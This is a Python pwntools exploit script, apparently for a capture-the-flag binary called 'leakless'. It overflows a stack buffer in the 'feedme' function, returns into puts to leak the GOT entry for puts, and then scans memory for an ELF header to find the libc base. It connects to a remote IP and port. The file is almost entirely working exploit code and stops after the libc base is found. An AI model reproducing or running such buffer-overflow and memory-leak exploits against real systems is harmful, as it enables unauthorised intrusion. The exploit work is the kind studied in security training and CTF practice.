from pwn import *

elf = ELF("./leakless")
plt_puts = elf.plt['puts']
addr_vuln = elf.symbols['feedme']
got_puts = elf.got['puts']

def leak(address):
    payload = "A" * 0x4c
    payload += p32(plt_puts)
    payload += p32(addr_vuln)
    payload += p32(address)
    sock.send(payload)
    data = sock.recv(4)
    if data == '\n':
        return "\x00"
    print(hex(address), repr(data))
    sock.recv(4096, timeout=0.1)
    return data

def get_libc(sock):
    libc_puts = u32(leak(got_puts))
    print("[+] puts: " + hex(libc_puts))
    libc_base = (libc_puts & 0xFFFFF000) - 0x00068000
    while True:
        libc_base += 0x1000
        if leak(libc_base) == '\x7fELF':
            print("[+] Found libc base: " + hex(libc_base))
            break
    

#sock = process("./leakless")
sock = remote("51.68.189.144", 31007)
libc = get_libc(sock)
